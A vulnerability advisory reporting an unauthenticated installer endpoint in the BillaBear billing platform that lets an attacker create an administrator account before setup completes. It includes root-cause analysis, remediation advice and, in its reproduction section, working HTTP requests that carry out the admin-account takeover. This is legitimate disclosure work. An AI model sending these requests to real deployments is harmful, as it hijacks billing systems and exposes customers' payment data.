# BillaBear Missing Authentication (Symfony 7)

**CWE-306 · Unauthenticated · attacker-created ROLE_ADMIN during the pre-install window of a billing platform**

> **Vendor:** BillaBear (https://github.com/billabear/billabear)
> **Product:** BillaBear (Symfony 7)
> **Affected version:** master @ 3ac15eea19bfff1cdf60b93332b8cb9fe171d51a (2026-09-13); no version tag on the tested commit
> **Affected endpoints:** `POST /install/process` (privilege escalation via `POST /app/authenticate`)
> **Disclosed via:** VulDB (submission #xxxxxx)
> **Note:** All accounts and hostnames in the examples below are attacker-chosen test values from an isolated local environment.

## 1. Summary

`POST /install/process` runs BillaBear's full installation pipeline without authentication and without an installed-state check: it is outside both firewalls (`^/api/`, `^/app/`) and every `access_control` rule. Against a deployment whose database schema has not been initialized yet (the docker-compose window between first boot and operator setup), an unauthenticated attacker can run the installer themselves and create a confirmed `ROLE_ADMIN` account with attacker-chosen credentials. On already-installed instances the request deterministically fails closed with a 500 schema exception — the endpoint stays exposed but has no window left.

## 2. Root Cause

| File | Lines | Role |
|---|---|---|
| `src/BillaBear/Controller/InstallController.php` | 50-100 | `processInstall()`: no authentication, no installed-state guard |
| `src/BillaBear/Controller/InstallController.php` | 37-52 | `installDefault()` (GET /install) *does* check installed state — the POST handler omits it |
| `config/packages/security.yaml` | firewalls | patterns `^/api/` and `^/app/` only; `/install/*` covered by neither |
| `config/packages/security.yaml` | access_control | rules for `^/app/` and `^/site/` only; no rule for `/install/*` |
| `src/BillaBear/Install/DatabaseCreator.php` | 31-37 | `SchemaTool::createSchema` throws on existing tables (the only fail-closed mechanism) |

```php
// src/BillaBear/Controller/InstallController.php:83-92 (inside processInstall)
$user = new User();
$user->setEmail($dto->getEmail());      // attacker-chosen
$user->setPassword($dto->getPassword()); // attacker-chosen
...
$user->setIsConfirmed(true);
$user->setRoles([User::ROLE_ADMIN]);
$userRepository->save($user);
```

## 3. Prerequisites

- No authentication (the route is fully public).
- The target's database schema must not be created yet — the deployment window between first boot and the operator completing setup (GET /install showing the installer page marks the window as open).
- The install path is PostgreSQL-only by design (`TimescalePlatform` extends `PostgreSQLPlatform`); the shipped docker-compose stack (postgres+timescaledb) is the affected target.

## 4. Reproduction

```http
GET /install HTTP/1.1
Host: target

-> HTTP 200, installer page rendered (window is open)

POST /install/process HTTP/1.1
Host: target
Content-Type: application/json

{"default_brand":"evilcorp","country":"US","from_email":"billing@evil.tld",
 "timezone":"UTC","webhook_url":"https://evil.tld/hook",
 "email":"attacker@evil.tld","password":"Passw0rd!x","currency":"USD"}

-> HTTP 200 []  (full install ran; users now holds the attacker account,
                 is_confirmed=true, roles=ROLE_ADMIN)
```

```http
POST /app/authenticate HTTP/1.1
Host: target
Content-Type: application/json

{"username":"attacker@evil.tld","password":"Passw0rd!x"}

-> HTTP 200 {"roles":["ROLE_ADMIN"],...} + session cookie
GET /app/customer HTTP/1.1   (with the session)
-> HTTP 200 admin data       (without the session: HTTP 401)
```

## 5. Confirmed Techniques

Verified end-to-end on the shipped deployment stack reproduced locally (PostgreSQL 16, PHP 8.4, APP_ENV=prod; environment-compat patches for cache adapters/timescale documented and reverted, none touch the audited path):

1. Fresh schema: `GET /install` → 200 installer page (no redirect to /login).
2. Unauthenticated `POST /install/process` → **200 []**; schema created (119 tables); `users` contains exactly one row: attacker email, `is_confirmed=true`, `roles=ROLE_ADMIN`.
3. `POST /app/authenticate` with the attacker pair → 200 `{"roles":["ROLE_ADMIN"],...}` + session; `GET /app/customer` → 200 with session vs 401 without.
4. Window-closed control: repeating the POST on the installed instance → **500** duplicate-table schema failure; no second user created. The POST handler has no installed-state guard of its own (unlike `installDefault()`), so closing the window relies solely on the `SchemaTool` exception.

## 6. Impact

Pre-installation hijack of a billing platform: the attacker-created administrator can read and modify all customer PII, subscriptions and payment records and bind payment providers once the instance goes live. The endpoint remains exposed and unguarded on installed instances, where it only fails closed via the schema exception — the guard exists nowhere in the application's own logic.

## 7. CVSS 3.1

`AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H` (Base 8.1 - High)

AC:H reflects the limited exploitation window (pre-install deployment state); window-closed exploitation is deterministically blocked, as verified.

## 8. Remediation

- Guard `POST /install/process` with the same installed-state check used by `GET /install` (abort when the settings table exists).
- Alternatively/additionally protect `/install/*` behind an installer token from an environment variable.
- Reject the route once installation is complete instead of relying on the `SchemaTool` exception to fail closed.

## 9. References

- Project: https://github.com/billabear/billabear
- CWE-306: https://cwe.mitre.org/data/definitions/306.html
- External disclosure: [GIST_URL]
- VulDB submission #xxxxxx

---
*All validation was performed in a local, isolated environment. The temporary environment was destroyed after testing.*
